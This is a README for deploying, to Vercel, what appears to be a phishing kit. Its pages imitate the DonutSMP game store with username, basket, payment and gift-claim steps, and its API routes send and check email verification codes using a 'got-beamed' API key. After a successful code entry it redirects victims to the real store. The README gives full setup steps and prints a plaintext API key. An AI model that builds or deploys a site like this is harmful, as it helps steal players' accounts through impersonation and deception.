# Vercel Deployment

This is a copy of the project configured for Vercel deployment.

## Structure

```
vercel-deploy/
├── vercel.json              # Vercel config (routes)
├── package.json             # pulls in @vercel/kv for the functions
├── api/
│   ├── send.js              # /api/send - sends verification code
│   └── check.js             # /api/check - verifies code
├── donutsmp-store-gate.html      # Store gate (username entry)
├── donutsmp-checkout-flow.html   # Basket step
├── donutsmp-payment-step.html     # Payment + code entry
├── donutsmp-checkout-layout.html # Gift claim page
└── pickaxe.svg
```

## Deploy to Vercel

### 1. Push to GitHub
```bash
cd vercel-deploy
git init
git add .
git commit -m "Vercel deploy"
gh repo create donut-verify --public --source=. --push
```

### 2. Import on Vercel
1. Go to [vercel.com](https://vercel.com) → **Add New Project**
2. Import your GitHub repo
3. **Environment Variables** (Project Settings → Environment Variables):
   ```
   VERIFY_KEY = ek_WVdwSgvGtcdjhzaSbLrcs1Ed-uaRuANxxfcEpt37L-M
   ```
4. **Storage** → Create **KV Database** → Connect to project
5. Click **Deploy**

### 3. Custom Domain (optional)
- Project Settings → Domains → Add your domain
- Vercel handles SSL automatically

## Routes

Defined in `vercel.json`. Static copies of each page also work directly.

| URL | Page |
|-----|------|
| `/` and `/login` | Store gate (username entry) |
| `/checkout` | Basket step |
| `/payment` | Payment step (email + code entry) |
| `/claim` and `/gift` | Gift claim page |

The flow is store gate → basket → payment. On success the payment step
redirects to `https://store.donutsmp.net`.

## API Routes

| Endpoint | Method | Body | Response |
|----------|--------|------|----------|
| `/api/send` | POST | `{ email }` | `{ ok: true, display: "...", taskId: "..." }` |
| `/api/check` | POST | `{ email, code, taskId }` | `{ ok: true }` or `{ ok: false, error: "..." }` |

## Environment Variables (Vercel Dashboard)

| Name | Value |
|------|-------|
| `VERIFY_KEY` | Your got-beamed API key |

## Storage (Vercel KV)

The API uses Vercel KV for task storage (5-min TTL, max 6 attempts). Create a KV database in Vercel Storage and connect it to the project.

## Local Development

```bash
npm i -g vercel
vercel dev
# Opens http://localhost:3000
```

## Costs

| Resource | Free Tier |
|----------|-----------|
| Vercel Functions | 100 GB-hours/mo |
| Vercel KV | 100k reads + 10k writes/mo |
| Bandwidth | 100 GB/mo |
| Custom Domains | Free |
| SSL | Free |

**Total: $0/month** within free tiers.